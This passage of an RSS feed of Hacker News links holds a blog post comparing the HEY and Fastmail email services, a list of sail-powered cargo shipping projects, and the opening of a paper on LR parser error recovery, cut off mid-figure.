</figure></action-text-attachment><p>Clips is a brilliant feature that I never knew I needed. Highlight some text and save it in your list of clips. I can see this feature being expanded in the future, such as filtering and being able to set expiry dates.</p></div><p><strong>Custom Domains</strong></p><div><p>Perhaps the most common complaint I've seen on Twitter is the lack of custom domain support. I run email off my own domain so this is of course something of a blocker to my own full-time adoption. I did try forwarding my email into HEY for a while so I could use the app in anger, but I'm not yet ready to make my @hey.com address my default so I've paused this for now. <a href="https://hey.com/custom-domains/">Custom domains are coming</a> in 2020 and I'm excited to see what they offer from day one. I hope they nail it.</p></div><p><strong>üîï Notifications&nbsp;</strong></p><div><p>Despite being something of an <a href="https://www.youtube.com/watch?v=z9UjeTMb3Yk">inbox zero</a> fiend, I have no problem with the <strong>Previously Seen</strong> list in my Imbox. I really like the idea of <strong>Paper Trail</strong> and <strong>The Feed</strong>, and autofiling email in there is great but I have a real gripe with notifications. I definitely <em>don't</em> want to be notified via push on my phone when a new item hits either of these areas, but when I log into HEY I definitely <em>do</em> want to be notified, visually, that there's something new to view in these areas. As it stands, I have to compulsively check each one irrespective of whether there's something new. HEY's philosophy is that I should ignore them entirely until I feel like reading my Feed, but in reality this is never going to work for me. I'd like to have HEY alert me to the fact that there's something there, and if I feel like reading the feed at that time I will, otherwise I'll come back later. If I don't know, I feel compelled to check which is just a waste of time.</p><p>Now forgive me for my sins, but I actually want to receive notifications for emails that hit my Imbox by default, not the other way round. With HEY there is no way to do this ‚Äì no notifications at all. You have to manually edit each contact and enable notifications for them specifically. I'd much rather HEY let me choose which is <em>my</em> preferred default, irrespective of the philosophy. Let me default to on.</p><p><strong>Imbox</strong></p></div><p>Please just call it Inbox! I can never unsee a typo here, I'm sorry. I understand but it just doesn't work for me.</p><div>
<p><strong>Quoted text rendering</strong><br>This is a total design challenge and HEY is no worse than Gmail in this regard, but I have to say Fastmail do a far better job of it. HEY rendering feels like a backwards step after using Fastmail and its multi-coloured threading. Hopefully it will improve over time.</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82Nz9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--91de462762132f39e441634c12f167e819f1c6ca" content-type="image/jpeg" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBTQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f569091fa601e5688d3533388044e529e598f984/IMG_0171.JPG" filename="IMG_0171.JPG" filesize="38317" width="780" height="520" previewable="true" presentation="gallery" caption="Fastmail's tasty quote rendering"><figure>
    <img src="https://codepatterns.org/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBTQT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--f569091fa601e5688d3533388044e529e598f984/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VY21WemFYcGxYM1J2WDJ4cGJXbDBXd2RwQWdBRWFRSUFBdz09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--61a3794242454801dbe4080bd2ea30c0627ce081/IMG_0171.JPG">

  <figcaption>
      Fastmail's tasty quote rendering
  </figcaption>
</figure></action-text-attachment><p><strong>Exporting</strong><br>The export to MBOX feature is great ‚Äì it's my data and it means I'm not locked in. I know that if I decide to leave HEY, I can easily export all my mail and push it back into Fastmail. However, I like to label a bunch of my emails and currently this metadata will be lost when exporting from HEY. I suggested to DHH that they use IMAP folders in the export to maintain label information and <a href="https://twitter.com/lylo/status/1275426572053471233?s=20">he said it was a good idea</a>, so perhaps it will see the light of day soon ü§û</p></div><p><strong>üò¥ Snooze</strong></p><p>Set Aside is great, I like it a lot. But sometimes there are emails that I want to set aside for a longer period and the Snooze feature in Gmail and Fastmail is super-handy for this. When you set something aside in HEY, the email is there in the stack, staring at you in the face every time you visit. This isn't desirable for 'set aside for ages' emails, so a Snooze function (either as part of Set Aside, or just in general) would be great.&nbsp;</p><div><p>Undoubtedly the killer feature of HEY is the built-in workflow. Some people have suggested that this is a feature that could be replicated in standard email, so I had a crack at this with my Fastmail account. While not being a match for HEY, it actually worked surprisingly well!</p><p>I first created labels for <strong>Reply Later</strong>, <strong>Set Aside</strong>, <strong>The Feed</strong> and <strong>Paper Trail:</strong></p></div><div>
<br><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82Mj9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--519051c905bfa91829786d87bba2ab033cc9fe0d" content-type="image/png" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBRdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--d255568b159096bebd32f072b8f79c4f90e2cdda/image.png" filename="image.png" filesize="7048" width="166" height="105" previewable="true" presentation="gallery" caption="Using Fastmail labels to replicate the HEY workflow"><figure>
    <img src="https://codepatterns.org/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBRdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--d255568b159096bebd32f072b8f79c4f90e2cdda/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VY21WemFYcGxYM1J2WDJ4cGJXbDBXd2RwQWdBRWFRSUFBdz09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--61a3794242454801dbe4080bd2ea30c0627ce081/image.png">

  <figcaption>
      Using Fastmail labels to replicate the HEY workflow
  </figcaption>
</figure></action-text-attachment><p>Moving mail into Reply Later or Set Aside is really easy in Fastmail because of their keyboard shortcuts: view the mail, click 'm' to bring up the 'Move' menu and then start typing 'Repl..' to label it as Reply Later. Admittedly not as slick as HEY but it's blazingly fast (as are most things in Fastmail) when you're used to it. </p><p>I then set up rules to move things into The Feed and Paper Trail. Again, not as simple as with HEY but the rules in Fastmail are very powerful so you do have a bit more flexibility here:</p><action-text-attachment sgid="BAh7CEkiCGdpZAY6BkVUSSI1Z2lkOi8vYmxvZ2xpbmUvQWN0aXZlU3RvcmFnZTo6QmxvYi82ND9leHBpcmVzX2luBjsAVEkiDHB1cnBvc2UGOwBUSSIPYXR0YWNoYWJsZQY7AFRJIg9leHBpcmVzX2F0BjsAVDA=--0497b10d4c7160b0d8f48c584f1fa4aace19103f" content-type="image/png" url="https://blogline.co/rails/active_storage/blobs/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBSUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5a85ebb4b8d252c1a8cd1e5242edeed0eb627d8c/image.png" filename="image.png" filesize="18662" width="465" height="117" previewable="true" presentation="gallery" caption="Using Fastmail's powerful rules to replicate The Feed"><figure>
    <img src="https://codepatterns.org/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBSUT09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5a85ebb4b8d252c1a8cd1e5242edeed0eb627d8c/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VY21WemFYcGxYM1J2WDJ4cGJXbDBXd2RwQWdBRWFRSUFBdz09IiwiZXhwIjpudWxsLCJwdXIiOiJ2YXJpYXRpb24ifX0=--61a3794242454801dbe4080bd2ea30c0627ce081/image.png">

  <figcaption>
      Using Fastmail's powerful rules to replicate The Feed
  </figcaption>
</figure></action-text-attachment></div><p><strong>The Screener</strong></p><div><p>I might be in the minority but I find The Screener more annoying than not. It turns out it's extremely rare that I receive an email from someone that I want to screen out. I can do this in Fastmail using blocking, but my blocklist is virtually empty. </p><p>If I was using HEY for my work email, however, it would be a <strong>completely different story </strong>which does make me wonder whether HEY's future success really lies in the business market.</p></div><div><p>Using HEY is a really nice and unique email experience, but it's early days and 'power users' like me will likely find it lacking in some areas. </p><p>I've already paid for my first year because I love the @hey.com email address, I really want to try HEY with custom domains when they launch, and I also want to see how it develops in the coming year. I'm also happy to pay Basecamp to keep developing this product as it feels important right now. <strong>The world needs more players in the email provider space, especially high-quality, privacy-focused products</strong>. Until HEY arrived, Fastmail was the only <em>major</em> player other than the obvious 'free' options of Gmail, Microsoft and Yahoo.</p><p>Can HEY fully replace Fastmail for me though? Will I be renewing in 12 month's time?</p><p>Once custom domains land, I think it <em>could</em> replace Fastmail for me. That said, I'll likely still end up paying for Fastmail irrespective of how HEY develops simply because of their excellent multi-domain support. So I'll probably end up paying for both! üòÖ</p><p>With Fastmail I can create forwarders on my family domain for the kids (I really hope HEY's custom domain feature will support this, but I'm not confident they will). I can also support fully-featured email on all the domains I own (such as the one for this blog!) without incurring any additional cost or hassle dealing with other email providers. Much as I'd ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codepatterns.org/2020/7/15/hey-vs-fastmail">https://codepatterns.org/2020/7/15/hey-vs-fastmail</a></em></p>]]>
            </description>
            <link>https://codepatterns.org/2020/7/15/hey-vs-fastmail</link>
            <guid isPermaLink="false">hacker-news-small-sites-23850899</guid>
            <pubDate>Wed, 15 Jul 2020 20:02:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sail Freight Projects Around the World]]>
            </title>
            <description>
<![CDATA[
Score 98 | Comments 69 (<a href="https://news.ycombinator.com/item?id=23850831">thread link</a>) | @privong
<br/>
July 15, 2020 | https://sailingdog.org/sail-freight-projects-around-the-world/ | <a href="https://web.archive.org/web/*/https://sailingdog.org/sail-freight-projects-around-the-world/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Sail-powered shipping is experiencing a revival! We couldn‚Äôt find a current list of all the various projects around the world that are attempting (and doing) to bring back sail freight, so we made one!</p><div><div id="attachment_171"><p><a href="http://fairtransport.eu/"><img aria-describedby="caption-attachment-171" src="http://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding-1024x683.jpg" alt="The Tres Hombres under Full Sail" width="730" height="487" data-wp-pid="171" srcset="https://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding-1024x683.jpg 1024w, https://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding-300x200.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding-810x540.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding-1140x760.jpg 1140w, https://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding-1200x800.jpg 1200w, https://sailingdog.org/wp-content/uploads/2015/03/treshombresshipbuilding.jpg 1800w" sizes="(max-width: 730px) 100vw, 730px"></a></p><p id="caption-attachment-171">Photo by Fairtransport</p></div><p>The <em>Tres Hombres</em> is currently the premiere&nbsp;commercially operating sail cargo ship in the world.&nbsp;The 32 meter schooner <em>Tres Hombres</em> has been sailing since 2009. She maintains a shipping route&nbsp;between Europe, islands in the Atlantic, the Caribbean and the United States.</p><p>With a capacity of 35 tons of cargo, the <em>Tres Hombres</em> focuses on moving Caribbean rum, fair-trade chocolate, and coffee. Crew positions are also available for any adventurous souls!</p><p>A second cargo ship, the <em>Nordlys,&nbsp;</em>will begin shipping for Fairtransport this summer (2015)!</p><p><strong>More Info</strong>:&nbsp;<a href="http://fairtransport.eu/about/">http://fairtransport.eu/about/</a></p><div id="attachment_174"><p><a href="http://www.vermontsailfreightproject.com/"><img aria-describedby="caption-attachment-174" src="http://sailingdog.org/wp-content/uploads/2015/03/Vermont-Sail-Freight-Setting-Sail-2-1024x666.jpg" alt="The Ceres, by Vermont Sail Freight Project" width="730" height="475" data-wp-pid="174" srcset="https://sailingdog.org/wp-content/uploads/2015/03/Vermont-Sail-Freight-Setting-Sail-2-1024x666.jpg 1024w, https://sailingdog.org/wp-content/uploads/2015/03/Vermont-Sail-Freight-Setting-Sail-2-300x195.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/Vermont-Sail-Freight-Setting-Sail-2-810x527.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/03/Vermont-Sail-Freight-Setting-Sail-2-1140x742.jpg 1140w, https://sailingdog.org/wp-content/uploads/2015/03/Vermont-Sail-Freight-Setting-Sail-2-1200x781.jpg 1200w" sizes="(max-width: 730px) 100vw, 730px"></a></p><p id="caption-attachment-174">The sailing barge Ceres. Photo by Jim Peppler.</p></div><p>The most famous and successful sail cargo project in the United States, the&nbsp;<em>Vermont Sail Freight Project&nbsp;</em> moves farm products from Vermont down to New York City, selling their goods at stops along the way.</p><p>Started in 2013, they have been very successful, receiving a lot of media coverage and praise. They operate during the summer, and will be starting back up again in June.</p><p><strong>More Info</strong>: <a href="http://www.vermontsailfreightproject.com/">http://www.vermontsailfreightproject.com</a></p><div id="attachment_203"><p><a href="https://sites.google.com/site/sailcargo/"><img aria-describedby="caption-attachment-203" src="http://sailingdog.org/wp-content/uploads/2015/03/kwai.jpg" alt="Sailing Vessel Kwai and Crew" width="640" height="480" data-wp-pid="203" srcset="https://sailingdog.org/wp-content/uploads/2015/03/kwai.jpg 640w, https://sailingdog.org/wp-content/uploads/2015/03/kwai-300x225.jpg 300w" sizes="(max-width: 640px) 100vw, 640px"></a></p><p id="caption-attachment-203">The S/V Kwai and Crew, photo by S/V Kwai</p></div><p>The&nbsp;<em>S/V Kwai&nbsp;</em>has been operating since 2006, moving goods between Hawaii and the Cook islands. The&nbsp;<em>Kwai&nbsp;</em>is a large (140ft) cargo ship that has been converted to sail.</p><p>They provide an important service to islands in the South Pacific that are infrequently visited by other suppliers. It sounds like they deliver practically anything, accepting orders before each voyage for supplies that are needed in the remote islands.</p><p><strong>More Info:&nbsp;</strong><a href="https://sites.google.com/site/sailcargo/">https://sites.google.com/site/sailcargo/</a></p><div id="attachment_177"><p><a href="http://www.salishseatrading.coop/"><img aria-describedby="caption-attachment-177" src="http://sailingdog.org/wp-content/uploads/2015/03/52952sequimNashSalish3MN10-15-14-10-15-14.jpg" alt="Salish Sea Trading Cooperative" width="600" height="429" data-wp-pid="177" srcset="https://sailingdog.org/wp-content/uploads/2015/03/52952sequimNashSalish3MN10-15-14-10-15-14.jpg 600w, https://sailingdog.org/wp-content/uploads/2015/03/52952sequimNashSalish3MN10-15-14-10-15-14-300x215.jpg 300w" sizes="(max-width: 600px) 100vw, 600px"></a></p><p id="caption-attachment-177">Loading grain unto a Salish Sea Co-op ship. Image Credit: Sequim Gazette Photo By Matthew Nash</p></div><p><em>The Salish Sea Trading Cooperative&nbsp;</em>is a Seattle based non-profit, providing low-carbon transportation of farm goods between the Olympic peninsula and Seattle. Their main goal is to provide food resiliency in the Puget Sound.</p><p>Twice a month during the summer they transport fresh, organic vegetables from Dharma Ridge Farm on the Olympic Penin<span>sula to Toast cafe in downtown Ballard by sail, selling the vegetables utilizing a subscription CSA format.</span></p><p><strong>More Info</strong>:&nbsp;<a href="http://www.salishseatrading.coop/">http://www.salishseatrading.coop/</a></p><div id="attachment_197"><p><a href="http://www.dragonflysailtransport.com/"><img aria-describedby="caption-attachment-197" src="http://sailingdog.org/wp-content/uploads/2015/03/dragonfly.jpg" alt="Dragonfly Sail, under sail" width="960" height="720" data-wp-pid="197" srcset="https://sailingdog.org/wp-content/uploads/2015/03/dragonfly.jpg 960w, https://sailingdog.org/wp-content/uploads/2015/03/dragonfly-300x225.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/dragonfly-810x608.jpg 810w" sizes="(max-width: 960px) 100vw, 960px"></a></p><p id="caption-attachment-197">Photo by Dragonfly Sail Transport Co.</p></div><p><em>Dragonfly Sail Transport Co.&nbsp;</em>is a Michigan based business offering carbon neutral shipping options to harbor towns on northern Lake Michigan.</p><p>Currently, they‚Äôre using one boat to transport local products up, down, or across Grand Traverse Bay by sail power. If you‚Äôre in the Lake Michigan area, check them out, they‚Äôre always looking for more partners!</p><p><strong>More Info</strong>:&nbsp;<a href="http://www.dragonflysailtransport.com/">http://www.dragonflysailtransport.com/</a></p><div id="attachment_181"><p><a href="http://www.grayhoundluggersailing.co.uk/"><img aria-describedby="caption-attachment-181" src="http://sailingdog.org/wp-content/uploads/2015/03/grayhound-lugger-1024x768.jpg" alt="Grayhound Lugger Sailing " width="730" height="548" data-wp-pid="181" srcset="https://sailingdog.org/wp-content/uploads/2015/03/grayhound-lugger-1024x768.jpg 1024w, https://sailingdog.org/wp-content/uploads/2015/03/grayhound-lugger-300x225.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/grayhound-lugger-810x608.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/03/grayhound-lugger-1140x855.jpg 1140w, https://sailingdog.org/wp-content/uploads/2015/03/grayhound-lugger-1200x900.jpg 1200w" sizes="(max-width: 730px) 100vw, 730px"></a></p><p id="caption-attachment-181">Photo by Grayhound Lugger Sailing</p></div><p>Utilizing a traditional 18th century Lugger,&nbsp;<em>Grayhound Lugger Sailing&nbsp;</em>delivers up to 4.5 tonnes of Breton and West Country produce back and forth across the English Channel.</p><p>They ship items such as ale, wine, vegetables, and grains, while providing sail adventures to people who want the experience of working on a traditional sailing vessel.</p><p><strong>More Info</strong>:&nbsp;<a href="http://www.grayhoundluggersailing.co.uk/">http://www.grayhoundluggersailing.co.uk/</a></p><div id="attachment_182"><p><a href="http://www.schoonerruth.com/"><img aria-describedby="caption-attachment-182" src="http://sailingdog.org/wp-content/uploads/2015/03/schooner-ruth.jpg" alt="The Schooner Ruth" width="960" height="685" data-wp-pid="182" srcset="https://sailingdog.org/wp-content/uploads/2015/03/schooner-ruth.jpg 960w, https://sailingdog.org/wp-content/uploads/2015/03/schooner-ruth-300x214.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/schooner-ruth-810x578.jpg 810w" sizes="(max-width: 960px) 100vw, 960px"></a></p><p id="caption-attachment-182">Photo by the Schooner Ruth team</p></div><p>The&nbsp;<em>Schooner Ruth&nbsp;</em>recently launched last December in the Caribbean. She is going to be replicating historic Caribbean regional trading routes, utilizing wind and solar electric power in order to minimize her carbon footprint.</p><p>Capable of hauling 25 metric tons, the group seeks to promote and enhance the regional supply chain for fresh and perishable produce. A sail training program onboard the schooner is also available for those looking for some adventure.</p><p><strong>More Info</strong>:&nbsp;<a href="http://www.schoonerruth.com/">http://www.schoonerruth.com/</a></p><div id="attachment_185"><p><a href="https://www.facebook.com/pages/Onion-Johnnies-Are-Not-Dead/897200483645273"><img aria-describedby="caption-attachment-185" src="http://sailingdog.org/wp-content/uploads/2015/03/onion-johnnies.jpg" alt="Onions shipped from the Onion Johnnies project" width="960" height="653" data-wp-pid="185" srcset="https://sailingdog.org/wp-content/uploads/2015/03/onion-johnnies.jpg 960w, https://sailingdog.org/wp-content/uploads/2015/03/onion-johnnies-300x204.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/onion-johnnies-810x551.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/03/onion-johnnies-145x100.jpg 145w" sizes="(max-width: 960px) 100vw, 960px"></a></p><p id="caption-attachment-185">Photo from The Onion Johnnies are not Dead facebook page</p></div><p>The <em>Onion Johnnies Project&nbsp;</em>recently did their first trip between Roscoff, France and Cornwall, UK, transporting a one ton load of organic onions and shallots in their ship,&nbsp;<em>Tanit</em>.</p><p>Their name comes from&nbsp;traditional merchants who used to make the same journey, selling French onions in England. The next trip of the&nbsp;<em>Tanit</em> is scheduled for this September.</p><p><strong>More Info</strong>: <a href="https://www.facebook.com/pages/Onion-Johnnies-Are-Not-Dead/897200483645273">https://www.facebook.com/pages/Onion-Johnnies-Are-Not-Dead/897200483645273</a></p><div id="attachment_187"><p><a href="http://www.timbercoast.com/"><img aria-describedby="caption-attachment-187" src="http://sailingdog.org/wp-content/uploads/2015/03/timbercoast.jpg" alt="The Timbercoast sail cargo ship" width="800" height="600" data-wp-pid="187" srcset="https://sailingdog.org/wp-content/uploads/2015/03/timbercoast.jpg 800w, https://sailingdog.org/wp-content/uploads/2015/03/timbercoast-300x225.jpg 300w" sizes="(max-width: 800px) 100vw, 800px"></a></p><p id="caption-attachment-187">Photo by the Timbercoast team</p></div><p>The cargo sailing ship&nbsp;<em>Timbercoast&nbsp;</em>will soon be undertaking a journey from Europe, across the Atlantic and Caribbean sea, through the Panama canal, and then all the way across the Pacific to Australia.</p><p>Once in Australia she‚Äôll be used to pioneer a permanent liner service between ports along the Queensland Coast and the Great Barrier Reef.</p><p>They are hoping to demonstrate that sustainable and economically fair sea transport is possible in the modern age, and is greatly needed to reduce humanities environmental impact.</p><p><strong>More Info</strong>:&nbsp;<a href="http://www.timbercoast.com/">http://www.timbercoast.com</a></p><div id="attachment_189"><p><a href="http://greenheartproject.org/en/"><img aria-describedby="caption-attachment-189" src="http://sailingdog.org/wp-content/uploads/2015/03/greenheart-1024x576.jpg" alt="The S/V Greenheart design" width="730" height="411" data-wp-pid="189" srcset="https://sailingdog.org/wp-content/uploads/2015/03/greenheart-1024x576.jpg 1024w, https://sailingdog.org/wp-content/uploads/2015/03/greenheart-300x169.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/greenheart-810x455.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/03/greenheart.jpg 1030w" sizes="(max-width: 730px) 100vw, 730px"></a></p><p id="caption-attachment-189">Render from the Greenheart design team</p></div><p><em>The Greenheart Project&nbsp;</em>is a collaborative initiative to develop new types of simple, sustainable, low-cost, zero-emissions, sail and solar-powered ships. Their design of the open-source ship, the&nbsp;<em>S/V Greenheart,&nbsp;</em>is almost complete.</p><p>The&nbsp;<em>Greenheart&nbsp;</em>is specifically designed to service communities marginalized by a lack of capital, that hold a poor position in the global trade system, and that don‚Äôt have access to deep water ports.</p><p><strong>More Info</strong>:&nbsp;<a href="http://greenheartproject.org/en/">http://greenheartproject.org/en/</a></p><div id="attachment_191"><p><a href="http://www.fairwindstradingcompany.org/"><img aria-describedby="caption-attachment-191" src="http://sailingdog.org/wp-content/uploads/2015/03/fair-winds.jpg" alt="The Fair Winds Trading Company" width="1000" height="1000" data-wp-pid="191" srcset="https://sailingdog.org/wp-content/uploads/2015/03/fair-winds.jpg 1000w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-150x150.jpg 150w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-300x300.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-810x810.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-32x32.jpg 32w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-64x64.jpg 64w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-96x96.jpg 96w, https://sailingdog.org/wp-content/uploads/2015/03/fair-winds-128x128.jpg 128w" sizes="(max-width: 1000px) 100vw, 1000px"></a></p><p id="caption-attachment-191">Render by the Fair Winds Trading Company</p></div><p>The&nbsp;<em>Fair Winds Trading Company&nbsp;</em>is working to develop a zero-emissions and low-impact sail cargo ship that can access goods where they‚Äôre produced.</p><p>Since many developing countries don‚Äôt have access to the infrastructure to handle giant container ships, they want to develop a ship that can bring these countries into the world-wide market, but without increasing environmental impact.</p><p><em>Fair Winds&nbsp;</em>also has a number of other projects to help strengthen the economies of developing nations.</p><p><strong>More Info</strong>:&nbsp;<a href="http://www.fairwindstradingcompany.org/">http://www.fairwindstradingcompany.org/</a></p><div id="attachment_91"><p><a href="http://sailingdog.org/about-us/"><img aria-describedby="caption-attachment-91" src="http://sailingdog.org/wp-content/uploads/2015/02/IMG_7505-1024x683.jpg" alt="Anchored out in Port Townsend" width="730" height="487" data-wp-pid="91" srcset="https://sailingdog.org/wp-content/uploads/2015/02/IMG_7505-1024x683.jpg 1024w, https://sailingdog.org/wp-content/uploads/2015/02/IMG_7505-300x200.jpg 300w, https://sailingdog.org/wp-content/uploads/2015/02/IMG_7505-810x540.jpg 810w, https://sailingdog.org/wp-content/uploads/2015/02/IMG_7505-1140x760.jpg 1140w, https://sailingdog.org/wp-content/uploads/2015/02/IMG_7505-1200x800.jpg 1200w" sizes="(max-width: 730px) 100vw, 730px"></a></p><p id="caption-attachment-91">Photo by Mahonri Gibson</p></div><p>Currently we‚Äôve become less focused on sail freight specifically, and more focused on sustainable distribution in general, via whatever means, incorporating biofuel or electric powered vehicles, as well as wind transport when it‚Äôs practical and efficient.</p><p>We are planning to do at least a few cargo trips around the Salish Sea aboard our two boats this summer however, and are actively working to find more partners. Stay tuned!</p><p><strong>More Info:</strong>&nbsp;<a title="About Us" href="http://sailingdog.org/about-us/">http://sailingdog.org/about-us/</a></p></div></div>]]>
            </description>
            <link>https://sailingdog.org/sail-freight-projects-around-the-world/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23850831</guid>
            <pubDate>Wed, 15 Jul 2020 19:58:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't Panic! Better, Fewer, Syntax Errors for LR Parsers]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 36 (<a href="https://news.ycombinator.com/item?id=23850718">thread link</a>) | @matt_d
<br/>
July 15, 2020 | https://soft-dev.org/pubs/html/diekmann_tratt__dont_panic/ | <a href="https://web.archive.org/web/*/https://soft-dev.org/pubs/html/diekmann_tratt__dont_panic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  

<p><strong>Abstract</strong>  
<span>Syntax errors are generally easy to fix for humans, but not for parsers in general nor LR parsers in</span>
<span>particular. Traditional ‚Äòpanic mode‚Äô error recovery, though easy to implement and applicable to</span>
<span>any grammar, often leads to a cascading chain of errors that drown out the original. More</span>
<span>advanced error recovery techniques suffer less from this problem but have seen little practical use</span>
<span>because their typical performance was seen as poor, their worst case unbounded, and the</span>
<span>repairs they reported arbitrary. In this paper we introduce the </span><span>CPCT</span><span>+</span>  <span>algorithm, and an</span>
<span>implementation of that algorithm, that address these issues. First, </span><span>CPCT</span><span>+</span> <span>reports the complete set of</span>
<span>minimum cost repair sequences for a given location, allowing programmers to select the one that</span>
<span>best fits their intention. Second, on a corpus of 200,000 real-world syntactically invalid Java</span>
<span>programs, </span><span>CPCT</span><span>+</span>  <span>is able to repair 98.37%</span><span>¬±</span><span>0.017% </span><span>of files within a timeout of 0.5s. Finally,</span>
<span>CPCT</span><span>+</span> <span>uses the complete set of minimum cost repair sequences to reduce the cascading error</span>
<span>problem, where incorrect error recovery causes further spurious syntax errors to be identified.</span>
<span>Across the test corpus, </span><span>CPCT</span><span>+</span> <span>reports 435,812</span><span>¬±</span><span>473 </span><span>error locations to the user, reducing the</span>
<span>cascading error problem substantially relative to the 981,628</span><span>¬±</span><span>0 </span><span>error locations reported by panic</span>
<span>mode.</span>
</p>

<h3><span>1</span> <a id="x1-10001"></a>Introduction</h3>
<!--l. 131--><p>Programming is a humbling job which requires acknowledging that we will make untold errors in
our quest to perfect a program. Most troubling are semantic errors, where we intended the
program to do one thing, but it does another. Less troubling, but often no less irritating, are
syntax errors, which are generally minor deviances from the exacting syntax required by a
compiler. So common are syntax errors that parsers in modern compilers are designed to cope
with us making several: rather than stop on the first syntax error, they attempt to
<span>recover </span>from it. This allows them to report, and us to fix, all our syntax errors in one
go.
</p><!--l. 141--><p>When error recovery works well, it is a useful productivity gain. Unfortunately, most current
error recovery approaches are simplistic. The most common grammar-neutral approach to error
recovery are those algorithms described as ‚Äòpanic mode‚Äô (e.g.&nbsp;[<a href="#Xholub90compilerdesign">13</a>, p.&nbsp;348]) which skip input until
the parser finds something it is able to parse. A more grammar-specific variation of this
idea is to skip input until a pre-determined synchronisation token (e.g. ‚Äò;‚Äô in Java) is
reached&nbsp;[<a href="#Xdegano95comparison">8</a> , p.&nbsp;3], or to try inserting a single synchronisation token. Such strategies are
often unsuccessful, leading to a cascade of spurious syntax errors (see Figure&nbsp;<a href="#x1-1018r1">1<!--tex4ht:ref: fig:javaerror --></a> for an
example). Programmers quickly learn that only the location of the first error in a file ‚Äì not
the reported repair, nor the location of subsequent errors ‚Äì can be relied upon to be
accurate.
</p>
                                                                            
                                                                            
<hr><div>
                                                                            
                                                                            
                                                                            
                                                                            
<div><div><table id="TBL-1"><colgroup id="TBL-1-1g"><col id="TBL-1-1"><col id="TBL-1-2"></colgroup><tbody><tr id="TBL-1-1-"><td id="TBL-1-1-1"> <!--l. 159--><!--l. 160--><p><span>(a)</span> </p> </td><td id="TBL-1-1-2"> <div><!--l. 166-->
<p><span><a id="x1-1002r1"></a></span><span>class</span><span>&nbsp;</span><span>C</span><span>&nbsp;</span><span>{</span><span>&nbsp;</span><br><span><a id="x1-1003r2"></a></span><span>&nbsp;</span><span>&nbsp;</span><span>int</span><span>&nbsp;</span><span>x</span><span>&nbsp;</span><span>y</span><span>;</span><span>&nbsp;</span><br><span><a id="x1-1004r3"></a></span><span>}</span>
</p>
  </div>                         </td>
</tr><tr id="TBL-1-2-"><td id="TBL-1-2-1"> <!--l. 173--><!--l. 175--><p><span>(c)</span> </p></td><td id="TBL-1-2-2"> <div><!--l. 181-->
<p><span><a id="x1-1006r1"></a></span><span>Parsing</span><span>&nbsp;</span><span>error</span><span>&nbsp;</span><span>at</span><span>&nbsp;</span><span>line</span><span>&nbsp;</span><span>2</span><span>&nbsp;</span><span>col</span><span>&nbsp;</span><span>9.</span><span>&nbsp;</span><span>Repair</span><span>&nbsp;</span><br><span>
